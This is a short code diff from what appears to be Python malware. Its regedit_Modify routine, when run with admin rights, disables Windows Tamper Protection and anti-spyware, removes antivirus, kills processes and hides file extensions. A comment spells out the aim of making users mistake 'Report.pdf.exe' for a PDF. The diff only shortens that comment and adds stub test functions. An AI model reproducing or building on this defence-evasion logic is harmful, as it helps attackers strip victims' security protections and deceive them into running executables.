@@ -104,14 +104,22 @@ def check_admin():
 
 def regedit_Modify():
     is_admin = check_admin()
-    if is_admin: # admin privilages should be able to modify the registry by disabling the AVs, hide file extensions to mistake user(show Report.pdf instead Report.pdf.exe) and kill processes 
+    if is_admin: # admin privilages should be able to modify the registry by disabling the AVs, hide file extensions and kill processes 
         dis_Tamper_Protection()
         dis_AntiSpyware()
         remove_AV()
         hide_file_extensions(hide=True)
         kill_processes()
+        test_something_admin()
     else:
         remove_AV()
         kill_processes() # we can try to kill AV processes even if the user is not an admin and try sth malicious, but most likely it will not work with low privilages
+        test_something()
+
+def test_something_admin():
+           print("hello!")
+
+def test_something():
+           print("hello!")
 
 
